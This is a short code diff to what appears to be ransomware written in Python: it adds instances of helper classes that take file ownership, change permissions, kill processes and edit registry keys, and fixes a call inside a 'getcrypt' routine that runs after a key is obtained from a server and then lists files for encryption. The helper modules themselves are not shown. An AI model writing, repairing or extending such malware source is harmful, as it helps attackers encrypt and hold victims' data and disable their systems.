@@ -6,6 +6,14 @@ from modules.system import delproc, regedit
 from modules.network import host_connect, sendkey_smtp
 import os, time
 
+# INIT VARIABLE TO CALL THE FUNCTION INTO THE CLASS
+gt = takeown.GetOwn()
+gr = icacls.GetPermission()
+dr = delproc.Remove()
+dk = delproc.Kill()
+rkey = regedit.ManageKey()
+
+# FUNCTION CALLED AFTER OBTAINED THE KEY FROM THE SERVER
 def getcrypt():
     gt.proc()
     gr.proc()
@@ -13,7 +21,7 @@ def getcrypt():
     dr.stsk()
     rkey.setkey()
     rkey.delkey()
-    regedit.setInit()
+    rkey.setInit()
     gt.dir()
     gr.dir()
     crypt.filelist()
